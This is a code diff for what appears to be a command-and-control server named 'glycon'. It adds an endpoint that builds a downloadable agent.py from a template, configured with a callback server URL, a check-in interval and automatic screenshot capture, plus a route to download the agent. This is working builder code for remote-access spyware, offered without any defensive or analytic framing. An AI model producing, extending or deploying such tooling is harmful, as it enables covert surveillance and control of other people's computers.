@@ -1,4 +1,4 @@
-﻿from flask import jsonify, request, Response
+﻿from flask import jsonify, request, Response, send_from_directory
 from flask_login import login_required
 from glycon.secure_comms import SecureComms
 from glycon.config import CONFIG
@@ -6,7 +6,7 @@ from datetime import datetime
 import sqlite3
 import traceback
 import json
-import base64
+import base64, os
 
 def init_api_routes(app, socketio):
     @app.route('/api/task', methods=['POST'])
@@ -299,5 +299,66 @@ def init_api_routes(app, socketio):
                 conn.rollback()
                 conn.close()
             return jsonify({'status': 'error', 'message': str(e)}), 500
-            
         
+
+    @app.route('/api/generate_agent', methods=['POST'])
+    @login_required
+    def generate_agent():
+        try:
+            data = request.get_json()
+            if not data:
+                return jsonify({"status": "error", "message": "No data provided"}), 400
+
+            # Create agents directory if it doesn't exist
+            agents_dir = os.path.join(app.root_path, 'agents')
+            os.makedirs(agents_dir, exist_ok=True)
+
+            # Prepare configuration
+            config = {
+                'checkin_interval': max(5, min(int(data.get('checkin_interval', 10)), 3600)),
+                'server_url': data.get('server_url', request.url_root).strip('/'),
+                'take_screenshots': bool(data.get('take_screenshots', True)),
+                'screenshot_frequency': max(1, min(int(data.get('screenshot_frequency', 10)), 100))
+            }
+
+            # Read template
+            template_path = os.path.join(app.root_path, 'templates', 'agent_template.py')
+            if not os.path.exists(template_path):
+                return jsonify({"status": "error", "message": "Agent template not found"}), 500
+
+            with open(template_path, 'r') as f:
+                template = f.read()
+
+            # Generate agent code
+            agent_code = template.format(
+                checkin_interval=config['checkin_interval'],
+                server_url=config['server_url'],
+                take_screenshots=str(config['take_screenshots']),
+                screenshot_frequency=config['screenshot_frequency']
+            )
+
+            # Save agent file
+            agent_path = os.path.join(agents_dir, 'agent.py')
+            with open(agent_path, 'w') as f:
+                f.write(agent_code)
+
+            return jsonify({
+                "status": "success",
+                "message": "Agent configuration saved",
+                "config": config
+            })
+
+        except Exception as e:
+            app.logger.error(f"Error generating agent: {str(e)}")
+            return jsonify({
+                "status": "error",
+                "message": f"Internal server error: {str(e)}"
+            }), 500
+
+    @app.route('/agents/download')
+    @login_required
+    def download_agent():
+        agents_dir = os.path.join(app.root_path, 'agents')
+        if not os.path.exists(os.path.join(agents_dir, 'agent.py')):
+            return jsonify({"status": "error", "message": "Agent file not found"}), 404
+        return send_from_directory(agents_dir, 'agent.py', as_attachment=True)
